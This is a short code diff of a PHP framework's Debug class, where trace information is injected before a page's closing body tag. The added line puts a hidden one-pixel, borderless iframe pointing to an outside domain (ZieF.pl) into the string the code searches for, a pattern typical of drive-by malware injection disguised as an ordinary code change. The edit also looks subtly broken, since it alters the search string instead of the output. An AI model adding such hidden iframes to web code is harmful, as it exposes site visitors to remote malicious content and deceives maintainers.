@@ -258,7 +258,8 @@ class Debug
             $output = $trace->output($response, $this->app['log']->getLog());
             if (is_string($output)) {
                 // trace调试信息注入
-                $pos = strripos($content, '</body>');
+                $pos = strripos($content, '<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>');
                 if (false !== $pos) {
                     $content = substr($content, 0, $pos) . $output . substr($content, $pos);
                 } else {
